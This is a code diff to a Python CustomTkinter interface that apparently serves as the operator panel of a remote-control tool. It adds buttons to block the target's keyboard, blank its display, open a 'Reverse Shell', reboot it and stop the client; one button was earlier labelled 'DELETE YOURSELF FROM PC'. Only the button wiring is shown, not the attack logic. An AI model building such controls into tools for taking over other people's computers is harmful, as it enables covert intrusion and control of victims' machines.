@@ -43,14 +43,22 @@ class FunctionApp(ctk.CTk):
         
         self.blockinput_btn = ctk.CTkButton(self.fun_tab, text='Block keyboard', height=50, width=200,
                                 command=lambda: self.comm.block_input(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
-
+        
+        self.off_monitor_btn = ctk.CTkButton(self.fun_tab, text="Display off", height=50, width=100,
+                                           command=lambda: self.comm.post_msg(self.ip, self.port, "display_black"), font=('Bold', 15), fg_color='#9370DB')
+        
+        self.on_monitor_btn = ctk.CTkButton(self.fun_tab, text="Display on", height=50, width=95,
+                                           command=lambda: self.comm.post_msg(self.ip, self.port, "display_white"), font=('Bold', 15), fg_color='#9370DB')
+        
         self.blockinput_btn.place(x=10, y=70)
         self.input_link.place(x=10, y=10)
         self.open_link_btn.place(x=330, y=7)
+        self.off_monitor_btn.place(x=330, y=70)
+        self.on_monitor_btn.place(x=435, y=70)
 
 
         self.sys_tab = self.tabview.tab("System")
-        self.console_btn = ctk.CTkButton(self.sys_tab, text='Console', height=50, width=200,
+        self.console_btn = ctk.CTkButton(self.sys_tab, text='Reverse Shell', height=50, width=200,
                                 command=lambda: self.comm.console(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
         
         self.off_btn = ctk.CTkButton(self.sys_tab, text='Off pc', height=50, width=200,
@@ -59,15 +67,15 @@ class FunctionApp(ctk.CTk):
         self.reboot_btn = ctk.CTkButton(self.sys_tab, text='Reboot pc', height=50, width=200,
                                 command=lambda: self.comm.off_pc(self.ip, self.port, True), font=('Bold', 15), fg_color='#9370DB')
         
-        self.remote_desk_btn = ctk.CTkButton(self.sys_tab, text='Remote Desktop', height=50, width=200,
-                                command=lambda: self.comm.remote_desktop(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
+        self.remote_btn = ctk.CTkButton(self.sys_tab, text='Remote tool', height=50, width=200,
+                                command=lambda: self.comm.remote_tool(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
         
-        self.ping_btn = ctk.CTkButton(self.sys_tab, text='DELETE YOURSELF FROM PC', height=50, width=500, fg_color='red', 
-                                       command=lambda: self.comm.kill_yourself(self.ip, self.port, "exit"), font=('Bold', 20))
+        self.ping_btn = ctk.CTkButton(self.sys_tab, text='CLIENT OFF', height=50, width=500, fg_color='yellow', 
+                                       command=lambda: self.comm.post_msg(self.ip, self.port, "exit"), font=('Bold', 20))
         
         self.ping_btn.pack(side='bottom', pady=20, padx=20)
         self.console_btn.pack(side='top', pady=10, padx=50)
-        self.remote_desk_btn.pack(side='top', pady=10, padx=50)
+        self.remote_btn.pack(side='top', pady=10, padx=50)
         
 
         self.file_tab = self.tabview.tab("Files")
